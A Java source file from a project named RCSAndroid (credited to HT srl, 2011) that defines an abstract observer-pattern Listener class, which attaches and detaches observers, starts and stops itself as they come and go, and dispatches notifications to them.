/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 20-apr-2011
 **********************************************/

package com.ht.RCSAndroidGUI.listener;

import java.util.Iterator;
import java.util.Stack;

import com.ht.RCSAndroidGUI.event.EventBattery;
import com.ht.RCSAndroidGUI.interfaces.Observer;

public abstract class Listener<U> {
	/** The Constant TAG. */
	private static final String TAG = "Listener";

	protected Stack<Observer<U>> observers;

	public Listener() {
		observers = new Stack<Observer<U>>();
	}

	public synchronized boolean attach(Observer<U> o) {
		// Object already in the stack
		if (observers.search(o) != -1)
			return false;

		if (observers.isEmpty()) {
			start();
		}

		observers.push(o);
		return true;
	}

	public synchronized void detach(Observer<U> o) {
		if (observers.empty())
			return;

		observers.remove(o);

		if (observers.isEmpty()) {
			stop();
		}
	}

	/**
	 * dispatch, per ogni observer registrato viene chiamato il notification
	 * 
	 * @param elem
	 * @return
	 */
	int dispatch(U elem) {
		Object[] array;
		synchronized (this) {
			array = observers.toArray();
		}
		int result = 0;

		for (int i = 0; i < array.length; i++) {
			Observer<U> observer = (Observer<U>) array[i];
			result |= observer.notification(elem);
		}

		return result;
	}

	protected abstract void start();

	protected abstract void stop();
}
